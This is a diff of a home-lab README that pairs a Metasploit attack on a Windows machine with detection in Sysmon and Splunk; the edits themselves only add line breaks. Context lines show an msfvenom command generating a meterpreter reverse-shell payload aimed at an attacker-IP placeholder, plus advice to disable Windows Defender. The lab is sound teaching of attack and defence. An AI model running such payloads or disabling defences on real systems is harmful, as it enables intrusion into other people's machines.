@@ -194,6 +194,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcplhost=<Attacker_IP> lport=4444 -f
 <img width="512" height="339" alt="exploit1" src="https://github.com/user-attachments/assets/1cb6ca37-a5d8-4004-89e2-897c65fe3e32" />
 \
 <img width="325" height="406" alt="exploit2" src="https://github.com/user-attachments/assets/5cd6b544-45d1-442a-9515-24627d52f206" />
+\
 <img width="512" height="208" alt="exploit3" src="https://github.com/user-attachments/assets/89c0d8ce-d799-4dbf-a0ea-59eebd2a433d" />
 
 ## Step 10: Monitoring Logs in Splunk
@@ -209,11 +210,11 @@ In the Splunk search bar, use the following search queries to investigate the at
   <img width="1011" height="611" alt="splunk4" src="https://github.com/user-attachments/assets/ee170d74-b412-439f-a10f-5d33f53828e9" />
 
 ## Troubleshooting
-**Metasploit:** If the listener fails, verify that the **LHOST** (Kali IP) and **LPORT** are correctly configured in both the malware and the Metasploit handler. Ensure Windows Defender is disabled.
+**Metasploit:** If the listener fails, verify that the **LHOST** (Kali IP) and **LPORT** are correctly configured in both the malware and the Metasploit handler. Ensure Windows Defender is disabled.\
 **Splunk:** If no logs appear, confirm that your search query uses the correct index (`index=endpoint`) and that logs are being forwarded from the Windows machine.
 
 ## Key Lab Learnings
-**Attacker Skills:** Learn to use tools like Metasploit and Python to create and deploy malware.
-**Defender Skills:** Practice configuring Sysmon and Splunk to detect and analyze threats.
+**Attacker Skills:** Learn to use tools like Metasploit and Python to create and deploy malware.\
+**Defender Skills:** Practice configuring Sysmon and Splunk to detect and analyze threats.\
 **Forensic Analysis:** Learn to analyze network connections and logs to identify an attack.
 
